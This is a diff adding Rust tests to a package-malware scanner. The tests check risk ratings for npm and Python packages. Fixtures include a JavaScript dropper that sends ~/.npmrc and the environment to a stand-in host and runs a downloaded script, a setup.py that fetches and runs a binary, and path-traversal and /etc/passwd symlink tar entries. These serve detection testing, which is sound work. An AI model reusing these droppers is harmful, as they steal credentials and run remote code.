@@ -2661,3 +2661,832 @@ fn a_second_gzip_member_is_read_wherever_the_buffer_ends_or_zeros_pad() {
         );
     }
 }
+
+// ---------------------------------------------------------------------------
+// Round 6: install-time droppers, malicious dependencies, typosquats, archives
+// ---------------------------------------------------------------------------
+
+const DROPPER_JS: &str = "const https = require('https');
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
+const { exec } = require('child_process');
+
+const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
+const out = path.join(os.tmpdir(), 'helper.sh');
+
+https.get('https://example.invalid/payload.sh', (res) => {
+  const f = fs.createWriteStream(out);
+  res.pipe(f);
+  f.on('finish', () => exec('sh ' + out));
+});
+
+const req = https.request({ host: 'example.invalid', path: '/collect', method: 'POST' });
+req.write(JSON.stringify({ npmrc, env: process.env }));
+req.end();
+";
+
+fn r6_npm_dir(files: &[(&str, &str)]) -> TempDir {
+    let dir = TempDir::new().unwrap();
+    for (name, body) in files {
+        write(dir.path(), name, body.as_bytes());
+    }
+    dir
+}
+
+fn r6_npm_level(files: &[(&str, &str)]) -> NpmRisk {
+    let dir = r6_npm_dir(files);
+    analyze_npm_package(dir.path())
+        .unwrap()
+        .malicious_indicators
+        .risk_level
+}
+
+fn r6_high_npm(level: &NpmRisk) -> bool {
+    matches!(level, NpmRisk::High | NpmRisk::Critical)
+}
+
+#[test]
+fn a_js_file_an_install_hook_runs_is_install_time_code() {
+    let manifest = r#"{"name":"build-helper-kit","version":"1.0.0","scripts":{"preinstall":"node scripts/setup.js"}}"#;
+    let dir = r6_npm_dir(&[("package.json", manifest), ("scripts/setup.js", DROPPER_JS)]);
+    let pack = TempDir::new().unwrap();
+    let tarball = write(
+        pack.path(),
+        "build-helper-kit-1.0.0.tgz",
+        &tgz(&[
+            ("package/package.json", manifest.as_bytes()),
+            ("package/scripts/setup.js", DROPPER_JS.as_bytes()),
+        ]),
+    );
+    for path in [dir.path().to_path_buf(), tarball] {
+        let analysis = analyze_npm_package(&path).unwrap();
+        let rules: Vec<&str> = analysis
+            .source_findings
+            .iter()
+            .map(|f| f.rule.as_str())
+            .collect();
+        assert!(
+            rules.contains(&"Download written to disk and run"),
+            "{rules:?}"
+        );
+        assert!(
+            rules.contains(&"Credential file sent over the network"),
+            "{rules:?}"
+        );
+        assert!(
+            r6_high_npm(&analysis.malicious_indicators.risk_level),
+            "{:?}",
+            analysis.malicious_indicators.risk_level
+        );
+        // The hook counts as dangerous because of the file it runs, and the signals agree.
+        let hook = analysis
+            .scripts_analysis
+            .dangerous_commands
+            .iter()
+            .find(|c| c.script_name == "preinstall")
+            .expect("preinstall is a dangerous command");
+        assert!(
+            hook.risk_reason.contains("setup.js"),
+            "{}",
+            hook.risk_reason
+        );
+        assert!(analysis.security_analysis.data_exfiltration_risk);
+        assert!(analysis
+            .malicious_indicators
+            .risk_reasons
+            .iter()
+            .any(|r| r.contains("install-time script") && r.contains("preinstall")));
+    }
+}
+
+#[test]
+fn the_same_file_is_not_install_time_code_when_no_hook_runs_it() {
+    // Library code with the same behaviour still rates High on its own findings,
+    // but there is no install-time reason and no dangerous hook.
+    let dir = r6_npm_dir(&[
+        ("package.json", r#"{"name":"lib-x","version":"1.0.0"}"#),
+        ("lib/setup.js", DROPPER_JS),
+    ]);
+    let analysis = analyze_npm_package(dir.path()).unwrap();
+    assert!(analysis.scripts_analysis.dangerous_commands.is_empty());
+    assert!(!analysis
+        .malicious_indicators
+        .risk_reasons
+        .iter()
+        .any(|r| r.contains("install-time script")));
+}
+
+#[test]
+fn ordinary_network_and_build_code_stays_low() {
+    let manifest = |scripts: &str| format!(r#"{{"name":"ctl-pkg","version":"1.0.0"{scripts}}}"#);
+    // Library code that fetches JSON from an API.
+    let json_fetch = "const https = require('https');
+module.exports = (city, cb) => https.get('https://api.example.com/f?c=' + city, (res) => {
+  let body = '';
+  res.on('data', (c) => (body += c));
+  res.on('end', () => cb(null, JSON.parse(body)));
+});
+";
+    // An HTTP client library: requests, request bodies, downloads to a file, a regex exec.
+    let client = "const https = require('https');
+const fs = require('fs');
+function request(url, opts, body, cb) {
+  const req = https.request({ host: url, method: opts.method || 'GET' }, cb);
+  if (body) req.write(JSON.stringify(body));
+  req.end();
+}
+function download(url, dest, cb) {
+  https.get(url, (res) => res.pipe(fs.createWriteStream(dest)).on('finish', cb));
+}
+const m = /a(b)/.exec('ab');
+module.exports = { request, download };
+";
+    for (name, files) in [
+        (
+            "json fetch",
+            vec![
+                ("package.json", manifest("")),
+                ("index.js", json_fetch.to_string()),
+            ],
+        ),
+        (
+            "node-gyp build",
+            vec![(
+                "package.json",
+                manifest(r#","scripts":{"install":"node-gyp rebuild"}"#),
+            )],
+        ),
+        (
+            "postinstall message",
+            vec![
+                (
+                    "package.json",
+                    manifest(r#","scripts":{"postinstall":"node scripts/msg.js"}"#),
+                ),
+                (
+                    "scripts/msg.js",
+                    "console.log('Thanks for installing, docs at https://example.com');\n"
+                        .to_string(),
+                ),
+            ],
+        ),
+        (
+            "http client",
+            vec![
+                ("package.json", manifest("")),
+                ("index.js", client.to_string()),
+            ],
+        ),
+    ] {
+        let borrowed: Vec<(&str, &str)> = files.iter().map(|(a, b)| (*a, b.as_str())).collect();
+        let level = r6_npm_level(&borrowed);
+        assert!(
+            matches!(level, NpmRisk::Safe | NpmRisk::Low),
+            "{name}: {level:?}"
+        );
+    }
+}
+
+#[test]
+fn a_hook_command_names_the_files_it_runs() {
+    // Observable through the analysis: only a file the hook runs becomes install-time code.
+    for (hook, runs) in [
+        ("node scripts/setup.js", true),
+        ("node ./scripts/setup.js --flag", true),
+        ("sh scripts/setup.js && echo done", true),
+        ("node -e \"require('./scripts/setup.js')\"", false),
+        ("echo scripts/setup.js", false),
+        ("node ../outside.js", false),
+    ] {
+        let manifest = format!(
+            r#"{{"name":"hook-test","version":"1.0.0","scripts":{{"postinstall":{}}}}}"#,
+            serde_json::to_string(hook).unwrap()
+        );
+        let dir = r6_npm_dir(&[
+            ("package.json", &manifest),
+            ("scripts/setup.js", DROPPER_JS),
+        ]);
+        let analysis = analyze_npm_package(dir.path()).unwrap();
+        let found = analysis
+            .scripts_analysis
+            .dangerous_commands
+            .iter()
+            .any(|c| c.risk_reason.contains("setup.js"));
+        assert_eq!(found, runs, "{hook}");
+    }
+}
+
+#[test]
+fn python_setup_py_that_downloads_and_runs_rates_high_and_a_version_fetch_does_not() {
+    let dir = TempDir::new().unwrap();
+    write(
+        dir.path(),
+        "drop/setup.py",
+        b"import subprocess\nimport urllib.request\nfrom setuptools import setup\n\nurllib.request.urlretrieve(\"https://example.invalid/stage2.bin\", \"/tmp/stage2.bin\")\nsubprocess.call([\"/tmp/stage2.bin\"])\n\nsetup(name=\"droppy\", version=\"1.0.0\")\n",
+    );
+    let analysis = analyze_python_package(&dir.path().join("drop")).unwrap();
+    assert!(
+        matches!(
+            analysis.malicious_indicators.risk_level,
+            PyRisk::High | PyRisk::Critical
+        ),
+        "{:?}",
+        analysis.malicious_indicators.risk_level
+    );
+    assert!(analysis
+        .source_findings
+        .iter()
+        .any(|f| f.rule == "Download written to disk and run"));
+
+    write(
+        dir.path(),
+        "ver/setup.py",
+        b"import urllib.request\nfrom setuptools import setup\nv = urllib.request.urlopen('https://example.com/latest.txt').read().decode().strip()\nsetup(name='verfetch', version='1.0.0')\n",
+    );
+    let analysis = analyze_python_package(&dir.path().join("ver")).unwrap();
+    assert!(
+        matches!(
+            analysis.malicious_indicators.risk_level,
+            PyRisk::Safe | PyRisk::Low
+        ),
+        "{:?}",
+        analysis.malicious_indicators.risk_level
+    );
+}
+
+#[tokio::test]
+async fn a_dependency_on_a_known_malicious_release_rates_high_and_says_malware() {
+    let dir = TempDir::new().unwrap();
+    // A fully scanned package that depends on two such releases.
+    write(
+        dir.path(),
+        "dep/package.json",
+        br#"{"name":"uses-bad-deps","version":"1.0.0","dependencies":{"event-stream":"3.3.6","node-ipc":"10.1.1"}}"#,
+    );
+    write(dir.path(), "dep/index.js", b"module.exports = 1;\n");
+    // A lock file that pins one.
+    let lock = write(
+        dir.path(),
+        "lock/package-lock.json",
+        br#"{"name":"app","version":"1.0.0","lockfileVersion":3,"packages":{"":{"name":"app","version":"1.0.0","dependencies":{"node-ipc":"10.1.1"}},"node_modules/node-ipc":{"version":"10.1.1"}}}"#,
+    );
+    // An ordinary advisory keeps its weight: Medium, not High.
+    let ordinary = write(
+        dir.path(),
+        "ordinary/package-lock.json",
+        br#"{"name":"app","version":"1.0.0","lockfileVersion":3,"packages":{"":{"name":"app","version":"1.0.0","dependencies":{"lodash":"4.17.4"}},"node_modules/lodash":{"version":"4.17.4"}}}"#,
+    );
+    for path in [dir.path().join("dep"), lock] {
+        let analysis = analyze_npm_package(&path).unwrap();
+        assert!(
+            r6_high_npm(&analysis.malicious_indicators.risk_level),
+            "{}: {:?}",
+            path.display(),
+            analysis.malicious_indicators.risk_level
+        );
+        let reasons = analysis.malicious_indicators.risk_reasons.join("; ");
+        assert!(reasons.contains("known malicious release"), "{reasons}");
+        assert!(!analysis
+            .dependencies
+            .vulnerability_summary
+            .malicious_releases
+            .is_empty());
+    }
+    let analysis = analyze_npm_package(&ordinary).unwrap();
+    assert!(
+        matches!(analysis.malicious_indicators.risk_level, NpmRisk::Medium),
+        "{:?}",
+        analysis.malicious_indicators.risk_level
+    );
+    assert!(!analysis
+        .malicious_indicators
+        .risk_reasons
+        .join(";")
+        .contains("malicious"));
+
+    // The answer a client sees names the release and marks the dependency rows.
+    let client = client().await;
+    let summary = summary(&client, "analyze_npm_package", &dir.path().join("dep")).await;
+    assert!(
+        summary["risk"]["reasons"]
+            .to_string()
+            .contains("known malicious release"),
+        "{summary}"
+    );
+    assert!(summary["dependencies"]["known_malicious_releases"]
+        .to_string()
+        .contains("event-stream@3.3.6"));
+    let (is_error, text) = call(
+        &client,
+        "analyze_npm_package",
+        json!({"package_path": dir.path().join("dep"), "section": "dependencies"}),
+    )
+    .await;
+    assert!(!is_error, "{text}");
+    let page: Value = serde_json::from_str(&text).unwrap();
+    assert!(page["known_malicious_releases"]
+        .to_string()
+        .contains("node-ipc@10.1.1"));
+    assert!(page["items"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .any(|row| row["name"] == "node-ipc" && row["known_malicious_release"] == true));
+    client.cancel().await.unwrap();
+}
+
+#[test]
+fn a_python_dependency_on_a_malicious_release_rates_high() {
+    let dir = TempDir::new().unwrap();
+    let release = py_malicious();
+    let name = release.first().expect("table has malicious packages");
+    let path = write(
+        dir.path(),
+        "requirements.txt",
+        format!("{name}\nrequests\n").as_bytes(),
+    );
+    let analysis = analyze_python_package(&path).unwrap();
+    assert!(
+        matches!(
+            analysis.malicious_indicators.risk_level,
+            PyRisk::High | PyRisk::Critical
+        ),
+        "{:?}",
+        analysis.malicious_indicators.risk_level
+    );
+    assert!(analysis
+        .malicious_indicators
+        .risk_reasons
+        .join(";")
+        .contains("known malicious release"));
+}
+
+#[test]
+fn a_suspected_typosquat_rates_at_least_medium_and_the_famous_name_stays_clean() {
+    for (name, famous) in [("lodahs", "lodash"), ("axioss", "axios")] {
+        let manifest = format!(r#"{{"name":"{name}","version":"1.0.0"}}"#);
+        let dir = r6_npm_dir(&[
+            ("package.json", &manifest),
+            ("index.js", "module.exports = 1;\n"),
+        ]);
+        let analysis = analyze_npm_package(dir.path()).unwrap();
+        assert!(
+            analysis
+                .malicious_indicators
+                .typosquatting_risk
+                .is_potential_typosquatting
+        );
+        assert!(
+            matches!(
+                analysis.malicious_indicators.risk_level,
+                NpmRisk::Medium | NpmRisk::High | NpmRisk::Critical
+            ),
+            "{name}: {:?}",
+            analysis.malicious_indicators.risk_level
+        );
+        let manifest = format!(r#"{{"name":"{famous}","version":"1.0.0"}}"#);
+        let dir = r6_npm_dir(&[
+            ("package.json", &manifest),
+            ("index.js", "module.exports = 1;\n"),
+        ]);
+        let analysis = analyze_npm_package(dir.path()).unwrap();
+        assert!(
+            !analysis
+                .malicious_indicators
+                .typosquatting_risk
+                .is_potential_typosquatting
+        );
+        // (The famous package's own old versions carry advisories, so only the name is judged.)
+        assert!(
+            !analysis
+                .malicious_indicators
+                .risk_reasons
+                .iter()
+                .any(|r| r.contains("resembles")),
+            "{famous}: {:?}",
+            analysis.malicious_indicators.risk_reasons
+        );
+    }
+    let dir = TempDir::new().unwrap();
+    for (name, flagged) in [("reqeusts", true), ("requests", false)] {
+        let path = write(
+            dir.path(),
+            &format!("{name}/setup.py"),
+            format!("from setuptools import setup\nsetup(name='{name}', version='2.31.0')\n")
+                .as_bytes(),
+        );
+        let analysis = analyze_python_package(path.parent().unwrap()).unwrap();
+        assert_eq!(
+            analysis
+                .malicious_indicators
+                .typosquatting_risk
+                .is_potential_typosquatting,
+            flagged,
+            "{name}"
+        );
+        if flagged {
+            assert!(
+                !matches!(
+                    analysis.malicious_indicators.risk_level,
+                    PyRisk::Safe | PyRisk::Low
+                ),
+                "{:?}",
+                analysis.malicious_indicators.risk_level
+            );
+        }
+    }
+}
+
+/// A tar header with a name written as is, `..` and absolute paths included.
+fn r6_raw_header(name: &[u8], kind: tar::EntryType, size: u64, link: Option<&[u8]>) -> tar::Header {
+    let mut h = tar::Header::new_gnu();
+    {
+        let gnu = h.as_gnu_mut().unwrap();
+        gnu.name[..name.len()].copy_from_slice(name);
+        if let Some(link) = link {
+            gnu.linkname[..link.len()].copy_from_slice(link);
+        }
+    }
+    h.set_entry_type(kind);
+    h.set_size(size);
+    h.set_mode(0o644);
+    h.set_cksum();
+    h
+}
+
+fn r6_unsafe_extras() -> Vec<(tar::Header, Vec<u8>)> {
+    let body = b"module.exports = 1;\n".to_vec();
+    vec![
+        (
+            r6_raw_header(
+                b"package/../../../escape.js",
+                tar::EntryType::Regular,
+                body.len() as u64,
+                None,
+            ),
+            body.clone(),
+        ),
+        (
+            r6_raw_header(
+                b"/abs/evil.js",
+                tar::EntryType::Regular,
+                body.len() as u64,
+                None,
+            ),
+            body,
+        ),
+        (
+            r6_raw_header(
+                b"package/link.js",
+                tar::EntryType::Symlink,
+                0,
+                Some(b"/etc/passwd"),
+            ),
+            vec![],
+        ),
+    ]
+}
+
+#[test]
+fn a_tarball_with_unsafe_entries_rates_high_and_lists_each_kind() {
+    let dir = TempDir::new().unwrap();
+    let npm = write(
+        dir.path(),
+        "trav-1.0.0.tgz",
+        &tar_with(
+            &[
+                ("package/package.json", PKG.as_bytes()),
+                ("package/index.js", b"module.exports = 1;\n"),
+            ],
+            &r6_unsafe_extras(),
+        ),
+    );
+    let analysis = analyze_npm_package(&npm).unwrap();
+    assert!(
+        r6_high_npm(&analysis.malicious_indicators.risk_level),
+        "{:?}",
+        analysis.malicious_indicators.risk_level
+    );
+    let rules: Vec<&str> = analysis
+        .source_findings
+        .iter()
+        .map(|f| f.rule.as_str())
+        .collect();
+    for rule in [
+        "Archive entry escapes the package directory",
+        "Archive entry with an absolute path",
+        "Symlink in a package archive",
+    ] {
+        assert!(rules.contains(&rule), "{rule} missing from {rules:?}");
+    }
+    let note = analysis.input.notes.join(" ");
+    assert!(
+        note.contains("/abs/evil.js") && note.contains("package/link.js -> /etc/passwd"),
+        "{note}"
+    );
+    // The absolute path is shown as the archive spells it, and the link is a listed file.
+    let listed: Vec<&str> = analysis
+        .files_analysis
+        .iter()
+        .map(|f| f.file_path.as_str())
+        .collect();
+    assert!(listed.contains(&"/abs/evil.js"), "{listed:?}");
+    assert!(listed.contains(&"package/link.js"), "{listed:?}");
+
+    // The same for a Python sdist.
+    let sdist = write(
+        dir.path(),
+        "p-1.0.tar.gz",
+        &tar_with(
+            &[(
+                "p-1.0/setup.py",
+                b"from setuptools import setup\nsetup(name='p', version='1.0')\n",
+            )],
+            &[(
+                r6_raw_header(b"p-1.0/../../x.py", tar::EntryType::Regular, 1, None),
+                b"x".to_vec(),
+            )],
+        ),
+    );
+    let analysis = analyze_python_package(&sdist).unwrap();
+    assert!(
+        matches!(
+            analysis.malicious_indicators.risk_level,
+            PyRisk::High | PyRisk::Critical
+        ),
+        "{:?}",
+        analysis.malicious_indicators.risk_level
+    );
+    assert!(analysis
+        .input
+        .notes
+        .iter()
+        .any(|n| n.contains("UNSAFE ARCHIVE ENTRIES")));
+
+    // An ordinary tarball has none of this.
+    let clean = write(
+        dir.path(),
+        "clean-1.0.0.tgz",
+        &tgz(&[
+            ("package/package.json", PKG.as_bytes()),
+            ("package/index.js", b"module.exports = 1;\n"),
+        ]),
+    );
+    let analysis = analyze_npm_package(&clean).unwrap();
+    assert!(analysis.input.notes.iter().all(|n| !n.contains("UNSAFE")));
+    assert!(matches!(
+        analysis.malicious_indicators.risk_level,
+        NpmRisk::Safe
+    ));
+}
+
+#[test]
+fn signals_and_counters_agree_with_the_findings() {
+    // A High obfuscation finding sets the obfuscation signal; a credential file
+    // posted over the network sets the exfiltration signal.
+    let eval = "eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());\n";
+    let dir = r6_npm_dir(&[
+        ("package.json", PKG),
+        ("index.js", eval),
+        ("steal.js", DROPPER_JS),
+    ]);
+    let analysis = analyze_npm_package(dir.path()).unwrap();
+    assert!(analysis
+        .source_findings
+        .iter()
+        .any(|f| f.category == "obfuscation" && f.severity == "High"));
+    assert!(analysis.security_analysis.obfuscation_detected);
+    assert!(analysis.security_analysis.data_exfiltration_risk);
+
+    // Python: the counters include setup.py, as the files list marks it scanned.
+    let dir = TempDir::new().unwrap();
+    let setup = b"from setuptools import setup\nsetup(name='cnt', version='1.0')\n";
+    let init = b"VALUE = 1\n";
+    write(dir.path(), "setup.py", setup);
+    write(dir.path(), "cnt/__init__.py", init);
+    let analysis = analyze_python_package(dir.path()).unwrap();
+    let marked = analysis
+        .files_analysis
+        .iter()
+        .filter(|f| f.source_scanned)
+        .count();
+    assert_eq!(marked, 2);
+    assert_eq!(analysis.input.files_scanned, marked);
+    assert_eq!(analysis.input.bytes_scanned, setup.len() + init.len());
+}
+
+#[tokio::test]
+async fn the_python_scripts_section_lists_modules_and_knows_a_dependency_list_has_no_setup() {
+    let dir = TempDir::new().unwrap();
+    write(
+        dir.path(),
+        "pkg/setup.py",
+        b"import subprocess\nimport base64\nfrom setuptools import setup\nsubprocess.call(['make'])\nsetup(name='sp', version='1.0')\n",
+    );
+    let reqs = write(dir.path(), "reqs/requirements.txt", b"requests==2.31.0\n");
+    let client = client().await;
+    let (is_error, text) = call(
+        &client,
+        "analyze_python_package",
+        json!({"package_path": dir.path().join("pkg"), "section": "scripts"}),
+    )
+    .await;
+    assert!(!is_error, "{text}");
+    let scripts: Value = serde_json::from_str(&text).unwrap();
+    let modules: Vec<&str> = scripts["suspicious_imports"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|i| i["module_name"].as_str().unwrap())
+        .collect();
+    assert!(
+        modules.contains(&"subprocess") && modules.contains(&"base64"),
+        "{modules:?}"
+    );
+    assert!(!modules.contains(&"Process execution"), "{modules:?}");
+    assert!(!scripts["dangerous_operations"]
+        .as_array()
+        .unwrap()
+        .is_empty());
+
+    let (is_error, text) = call(
+        &client,
+        "analyze_python_package",
+        json!({"package_path": reqs, "section": "scripts"}),
+    )
+    .await;
+    assert!(!is_error, "{text}");
+    let scripts: Value = serde_json::from_str(&text).unwrap();
+    assert!(scripts["setup_type"].is_null(), "{scripts}");
+    assert!(scripts["note"]
+        .as_str()
+        .unwrap()
+        .contains("no setup script"));
+    client.cancel().await.unwrap();
+}
+
+#[tokio::test]
+async fn the_tool_descriptions_scan_the_same_files_and_say_yara_needs_a_directory() {
+    let client = client().await;
+    let tools = client.list_all_tools().await.unwrap();
+    let describe = |name: &str| {
+        tools
+            .iter()
+            .find(|t| t.name == name)
+            .and_then(|t| t.description.as_ref())
+            .map(ToString::to_string)
+            .unwrap()
+    };
+    let npm = describe("analyze_npm_package");
+    let py = describe("analyze_python_package");
+    for text in [&npm, &py] {
+        for ext in [".js", ".mjs", ".tsx", ".py", ".pyw", ".pth", ".sh", ".ps1"] {
+            assert!(text.contains(ext), "{ext} missing from: {text}");
+        }
+        assert!(text.contains("UNPACKED directory"), "{text}");
+        assert!(!text.contains("yara_scan_file runs a rule over the package"));
+    }
+    client.cancel().await.unwrap();
+}
+
+#[test]
+fn far_apart_or_minified_network_write_and_exec_code_stays_low() {
+    let manifest = r#"{"name":"bundle-pkg","version":"1.0.0"}"#;
+    // A bundle: a fetch near the top, a file write in the middle and a child
+    // process at the end, thousands of lines apart, plus a Babel-style visitor.
+    let filler = "  const value = compute(items, options);\n".repeat(5000);
+    let bundle = format!(
+        "const https = require('https');\nconst fs = require('fs');\nconst cp = require('child_process');\n\
+https.get(url, cb);\n{filler}fs.writeFileSync(out, data);\n{filler}cp.execSync(command);\n\
+const visitor = {{\n  Function(path) {{\n    path.skip();\n  }},\n}};\n\
+// Function(offset: number) => number\nfunction make(a) {{ return new Function(a.name, body); }}\n"
+    );
+    // One minified line with every pattern in it.
+    let minified = format!(
+        "var a=require('https'),b=require('fs'),c=require('child_process');{}a.get(u,function(r){{b.writeFileSync(o,r);c.execSync(cmd)}});",
+        "var x=1;".repeat(300)
+    );
+    // The environment handed to a child process beside an unrelated POST.
+    let env_child = "const axios = require('axios');
+const { execFileSync } = require('child_process');
+function version(bin) {
+  return execFileSync(bin, ['--version'], { env: Object.assign({}, process.env, { LANG: 'C' }) });
+}
+function report(url, data) {
+  return axios.post(url, { body: data });
+}
+module.exports = { version, report };
+";
+    for (name, body) in [
+        ("bundle", bundle),
+        ("minified", minified),
+        ("env to child", env_child.to_string()),
+    ] {
+        let dir = r6_npm_dir(&[("package.json", manifest), ("index.js", &body)]);
+        let m = analyze_npm_package(dir.path())
+            .unwrap()
+            .malicious_indicators;
+        assert!(
+            matches!(m.risk_level, NpmRisk::Safe | NpmRisk::Low),
+            "{name}: {:?} {:?}",
+            m.risk_level,
+            m.risk_reasons
+        );
+    }
+    // The same statements close together, in order, are still a dropper.
+    let close = "const https = require('https');
+const fs = require('fs');
+const { exec } = require('child_process');
+https.get(url, (res) => {
+  const f = fs.createWriteStream(out);
+  res.pipe(f);
+  f.on('finish', () => exec('sh ' + out));
+});
+";
+    assert!(r6_high_npm(&r6_npm_level(&[
+        ("package.json", manifest),
+        ("index.js", close)
+    ])));
+}
+
+#[test]
+fn python_helpers_that_fetch_write_and_spawn_far_apart_stay_low() {
+    let filler = "    value = compute(items)\n".repeat(400);
+    let lib = format!(
+        "import os, subprocess, requests\n\
+def download(url, path):\n    r = requests.get(url)\n    open(path, 'wb').write(r.content)\n{filler}\
+def run(path):\n    subprocess.run([str(path), '--version'], env=os.environ)\n\
+def report(url, data):\n    requests.post(url, json=data)\n\
+def build(name):\n    os.system('svn checkout %s' % name)\n"
+    );
+    let dir = TempDir::new().unwrap();
+    write(
+        dir.path(),
+        "pyproject.toml",
+        b"[project]\nname = \"helper-lib\"\nversion = \"1.0.0\"\n",
+    );
+    write(dir.path(), "helper_lib/util.py", lib.as_bytes());
+    let analysis = analyze_python_package(dir.path()).unwrap();
+    assert!(
+        matches!(
+            analysis.malicious_indicators.risk_level,
+            PyRisk::Safe | PyRisk::Low
+        ),
+        "{:?} {:?}",
+        analysis.malicious_indicators.risk_level,
+        analysis.malicious_indicators.risk_reasons
+    );
+}
+
+#[test]
+fn a_malicious_dependency_adds_to_a_package_with_high_source_findings() {
+    let dropper = "const https = require('https');
+const fs = require('fs');
+const { exec } = require('child_process');
+https.get(url, (res) => {
+  const f = fs.createWriteStream(out);
+  res.pipe(f);
+  f.on('finish', () => exec('sh ' + out));
+});
+";
+    let plain = r#"{"name":"drop-pkg","version":"1.0.0"}"#;
+    let with_dep =
+        r#"{"name":"drop-pkg","version":"1.0.0","dependencies":{"event-stream":"3.3.6"}}"#;
+    let score = |manifest: &str| {
+        let dir = r6_npm_dir(&[("package.json", manifest), ("index.js", dropper)]);
+        let m = analyze_npm_package(dir.path())
+            .unwrap()
+            .malicious_indicators;
+        (m.risk_level, m.overall_risk_score)
+    };
+    let (alone, alone_score) = score(plain);
+    let (combined, combined_score) = score(with_dep);
+    assert!(matches!(alone, NpmRisk::High), "{alone:?}");
+    assert!(matches!(combined, NpmRisk::Critical), "{combined:?}");
+    assert!(combined_score > alone_score);
+
+    // Python: the same with a setup script that downloads, writes and runs.
+    let setup = "import subprocess, urllib.request
+from setuptools import setup
+urllib.request.urlretrieve(URL, '/tmp/x')
+subprocess.call(['sh', '/tmp/x'])
+setup(name='droppy', version='1.0.0'%DEPS%)
+";
+    let py_score = |deps: &str| {
+        let dir = TempDir::new().unwrap();
+        write(
+            dir.path(),
+            "setup.py",
+            setup.replace("%DEPS%", deps).as_bytes(),
+        );
+        let m = analyze_python_package(dir.path())
+            .unwrap()
+            .malicious_indicators;
+        (m.risk_level, m.overall_risk_score)
+    };
+    let (_, py_alone) = py_score("");
+    let (py_level, py_combined) = py_score(", install_requires=['ctx==0.1.2']");
+    assert!(matches!(py_level, PyRisk::Critical), "{py_level:?}");
+    assert!(py_combined > py_alone);
+}
